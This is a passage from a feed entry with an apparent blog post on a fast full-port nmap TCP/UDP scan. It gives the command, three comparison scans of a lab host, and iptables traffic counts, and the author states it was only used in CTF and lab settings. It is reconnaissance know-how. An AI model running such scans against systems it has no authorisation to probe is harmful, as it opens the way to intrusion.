MAC Address: 00:50:56:89:70:15 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 51.75 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Results:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# iptables -vn -L
Chain INPUT (policy ACCEPT 201K packets, 29M bytes)
pkts bytes target     prot opt in     out     source               destination
201K 9725K ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
pkts bytes target     prot opt in     out     source               destination
Chain OUTPUT (policy ACCEPT 254K packets, 33M bytes)
pkts bytes target     prot opt in     out     source               destination
254K   11M ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
0     0 ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Test 2:&lt;/p&gt;

&lt;p&gt;Notes: Default nmap scan, top 1000 common ports&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# nmap 10.11.1.5
Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-26 16:29 BST
Nmap scan report for 10.11.1.5
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:89:70:15 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Results:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# iptables -vn -L
Chain INPUT (policy ACCEPT 1378 packets, 205K bytes)
pkts bytes target     prot opt in     out     source               destination
1185 47980 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
pkts bytes target     prot opt in     out     source               destination
Chain OUTPUT (policy ACCEPT 1302 packets, 167K bytes)
pkts bytes target     prot opt in     out     source               destination
1283 56440 ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
0     0 ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Test 3:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# nmap -sT 10.11.1.5
Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-26 17:43 BST
Nmap scan report for 10.11.1.5
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
MAC Address: 00:50:56:89:70:15 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Results:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# iptables -vn -L
Chain INPUT (policy ACCEPT 1264 packets, 184K bytes)
pkts bytes target     prot opt in     out     source               destination
1199 48576 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
pkts bytes target     prot opt in     out     source               destination
Chain OUTPUT (policy ACCEPT 1206 packets, 175K bytes)
pkts bytes target     prot opt in     out     source               destination
1200 71968 ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
0     0 ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion-and-my-thoughts&quot;&gt;Conclusion and my thoughts:&lt;/h2&gt;
&lt;p&gt;After completing the above tests, I was able to view the amount of traffic that was sent over the network using my chosen technique compared to the others. Yes, lots of data was sent across to complete the task, however scanning results were presented in just under 52 seconds. Personally, if I know the environment can handle this scan – I will happily use it as a starting point.&lt;/p&gt;

&lt;p&gt;In this case, the entire port range scan didn’t pick up any obscure ports on the system – however it did miss a service port that was found within the default scan. As I mentioned before, it can sometimes return incorrect or misleading data but if the system had a couple of services running on higher, uncommon ports – the chances of spotting them with this scan are much higher than the other tested methods. I would also accompany this scan with additional scans, to help back these results up however the scope of ports to check will hopefully be narrowed down by this point.&lt;/p&gt;

&lt;p&gt;I would be interested to hear feedback about this technique and whether or not there are further ways to increase the reliability of the results as well as maintaining the speed. Let me know your thoughts on twitter.&lt;/p&gt;

&lt;p&gt;Thanks for reading.&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">Intro Recently I have been using a specific scan for my initial checks on a target system. The method I use scans the entire range of ports on both the TCP and UDP channels. As it has helped me out so much, I thought I would share. Disclaimer: This technique is most likely known and used by many, but fingers crossed some viewers will find use for it! I have only ever performed this within CTF’s/lab environments, please be sure to understand your target environment before firing off scans blindly. The command: nmap -sT -sU --min-rate 5000 --max-retries 1 -p- &amp;lt;target&amp;gt; Arguments: -sT : TCP Connect() technique -sU : enable UDP scanning –min-rate : sets the slowest amount packets that can be sent each second –max-retries : limits the number of port scan probe retransmissions -p- : Specifies to scan the entire port range (1 to 65535) To view all other possibilities, check out nmap’s man page. Benefits: Very quick scan Probes every possible port on the target, not just the top 1000 common ports like other scans Can help identify obscure ports that are being utilised by services Detriments: Not the quiestest traffic (see below for test results) Can produce results that misses a port that is found in another scan Tests: In order to help understand one of the detriments I listed above, I wanted to perform a couple of nmap scans against a chosen target, on a safe network. I used iptables to gather the results. In order to make sure the traffic was gathered during a scan, I configured iptables using the following set of commands. root@kali:~/Documents# iptables -I INPUT 1 -s 10.11.1.5 -j ACCEPT root@kali:~/Documents# iptables -I OUTPUT 1 -d 10.11.1.5 -j ACCEPT root@kali:~/Documents# iptables -Z The main focus of the tests was to gain an understanding of the amount of bytes that were sent across the network during a scan, relative to the time it took to complete and the ports that were found during a scan. I made sure to clear the obtained data before each different scan (-Z argument). Test 1: My chosen technique, scanning the entire port range across both TCP and UDP channels. root@kali:~/Documents# nmap -sT -sU --min-rate 5000 --max-retries 1 -p- 10.11.1.5 Not shown: 61350 closed ports, 57737 filtered ports, 11980 open|filtered ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 135/udp open msrpc MAC Address: 00:50:56:89:70:15 (VMware) Nmap done: 1 IP address (1 host up) scanned in 51.75 seconds Results: root@kali:~/Documents# iptables -vn -L Chain INPUT (policy ACCEPT 201K packets, 29M bytes) pkts bytes target prot opt in out source destination 201K 9725K ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 254K packets, 33M bytes) pkts bytes target prot opt in out source destination 254K 11M ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 0 0 ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 Test 2: Notes: Default nmap scan, top 1000 common ports root@kali:~/Documents# nmap 10.11.1.5 Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-26 16:29 BST Nmap scan report for 10.11.1.5 Host is up (0.13s latency). Not shown: 997 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 3389/tcp open ms-wbt-server MAC Address: 00:50:56:89:70:15 (VMware) Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds Results: root@kali:~/Documents# iptables -vn -L Chain INPUT (policy ACCEPT 1378 packets, 205K bytes) pkts bytes target prot opt in out source destination 1185 47980 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 1302 packets, 167K bytes) pkts bytes target prot opt in out source destination 1283 56440 ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 0 0 ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 Test 3: root@kali:~/Documents# nmap -sT 10.11.1.5 Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-26 17:43 BST Nmap scan report for 10.11.1.5 Host is up (0.12s latency). Not shown: 998 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn MAC Address: 00:50:56:89:70:15 (VMware) Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds Results: root@kali:~/Documents# iptables -vn -L Chain INPUT (policy ACCEPT 1264 packets, 184K bytes) pkts bytes target prot opt in out source destination 1199 48576 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 1206 packets, 175K bytes) pkts bytes target prot opt in out source destination 1200 71968 ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 0 0 ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 Conclusion and my thoughts: After completing the above tests, I was able to view the amount of traffic that was sent over the network using my chosen technique compared to the others. Yes, lots of data was sent across to complete the task, however scanning results were presented in just under 52 seconds. Personally, if I know the environment can handle this scan – I will happily use it as a starting point. In this case, the entire port range scan didn’t pick up any obscure ports on the system – however it did miss a service port that was found within the default scan. As I mentioned before, it can sometimes return incorrect or misleading data but if the system had a couple of services running on higher, uncommon ports – the chances of spotting them with this scan are much higher than the other tested methods. I would also accompany this scan with additional scans, to help back these results up however the scope of ports to check will hopefully be narrowed down by this point. I would be interested to hear feedback about this technique and whether or not there are further ways to increase the reliability of the results as well as maintaining the speed. Let me know your thoughts on twitter. Thanks for reading.</summary></entry></feed>